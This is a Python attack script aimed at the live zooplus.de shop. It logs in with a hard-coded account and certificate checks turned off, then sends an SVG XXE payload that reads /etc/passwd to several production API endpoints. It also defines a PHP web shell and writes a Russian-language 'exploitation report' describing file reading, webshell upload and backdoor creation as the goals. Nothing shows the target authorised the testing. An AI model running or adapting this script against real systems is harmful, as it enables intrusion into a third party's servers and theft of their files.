#!/usr/bin/env python3
"""Test all POST endpoints for file upload"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# All POST endpoints found
post_endpoints = [
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/semiprotected/api/checkout/state-api/v2/get",
    "/myaccount/api/order-details/v3/feature-flags",
    "/checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50",
]

svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
php_shell = '<?php system($_GET["cmd"]); ?>'

print("[*] Testing POST endpoints for file upload...\n")

for ep in post_endpoints:
    # Try multipart upload
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text or "root:x:0:0" in resp.text:
                print(f"  [CRITICAL] SVG XXE: {ep}")
                found_vulns.append({
                    "type": "svg_xxe_lfi",
                    "severity": "CRITICAL",
                    "endpoint": ep
                })
    except: pass
    
    # Try JSON with base64 file
    try:
        import base64
        payload = {
            "file": base64.b64encode(svg_xxe.encode()).decode(),
            "filename": "exploit.svg",
            "content_type": "image/svg+xml"
        }
        resp = s.post(f"{base}{ep}", json=payload, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE (JSON): {ep}")
                found_vulns.append({
                    "type": "svg_xxe_lfi",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "method": "JSON"
                })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Description:** Критичная уязвимость позволяет загружать файлы и выполнять XXE атаки.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Чтение файлов сервера\n")
            f.write("- Потенциальная загрузка webshell\n")
            f.write("- Создание бекдора\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No file upload vulnerabilities found in POST endpoints")

print("=" * 70)

